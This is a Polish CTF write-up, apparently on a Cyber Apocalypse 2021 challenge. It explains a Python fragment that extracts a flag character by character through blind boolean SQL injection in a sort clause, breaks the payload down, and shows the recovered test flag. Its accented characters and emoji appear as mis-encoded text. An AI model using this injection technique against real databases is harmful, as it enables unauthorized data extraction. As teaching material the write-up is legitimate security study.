---
Å¹rÃ³dÅ‚o: https://nosecurity.blog/cyberApocalypse2021
---

# WyglÄ…d platformy

![platforma](./platform.png)

# Fragment exploita

```python
finished = False
# atak siÅ‚owy zaczynamy od 1 znaku 
# SQL jako pierwszy indeks bierze 1
character_position = 1
# Starting with a blank string and then appending characters to it as we bruteforce
flag = ''

while not finished:
    for character in bruteforce_alphabet:

        sql_payload = '(CASE WHEN (SELECT SUBSTR(' + sql_field + ',1,' + str(character_position) + ') FROM ' + sql_table + sql_where + ')=\'' + flag + character + '\' THEN id ELSE count END);--'
        
        request = send_order_query(sql_payload)
		
        # jak znajdziemy znak to szukaj kolejnego
        if blind_boolean(request):
            flag += character
            character_position += 1
            print('Hit: ' + flag)
            break
		
        # jak dojdziemy do koÅ„ca alfabetu to znaczy, Å¼e przeszliÅ›my wszystko
        if character == bruteforce_alphabet[-1]:
            finished = True
```

# 1. 
```sql
SUBSTR(' + sql_field + ',1,' + str(character_position) + ')
```
> wybierz tyle znakÃ³w z pola sql_field na ile wskazuje character_position

# 2.
```sql
(SELECT 
    SUBSTR(' + sql_field + ',1,' + str(character_position) + ') 
FROM ' + sql_table + sql_where + ')
```
> weÅº znaki z **1.** i przekaÅ¼ do zapytania z **3.**

# 3.
```sql
(CASE WHEN 
    (SELECT SUBSTR(' + sql_field + ',1,' + str(character_position) + ') FROM ' + sql_table + sql_where + ')=\'' + flag + character + '\' 
THEN id ELSE count END);--
```
> jeÅ›li sprawdzany przez nas znak pasuje do tego w bazie to wybierz wedÅ‚ug **id**
> w przeciwnym przypadku wybierz wedÅ‚ug **count**

## Przypadek id

```sql
(CASE WHEN (1=1) THEN id ELSE count END)
```

`{'id': 1, 'emoji': 'ðŸ‘½', 'name': 'alien', 'count': 13}`

## Przypadek count

```sql
(CASE WHEN (1=2) THEN id ELSE count END)
```

`{'id': 3, 'emoji': 'ðŸ‘¾', 'name': 'alien monster', 'count': 0}`

# Wynik
```
...
Hit: CHTB{f4k3_fl4g_f0r_t3s
Hit: CHTB{f4k3_fl4g_f0r_t3st
Hit: CHTB{f4k3_fl4g_f0r_t3st1
Hit: CHTB{f4k3_fl4g_f0r_t3st1n
Hit: CHTB{f4k3_fl4g_f0r_t3st1ng
Hit: CHTB{f4k3_fl4g_f0r_t3st1ng}
```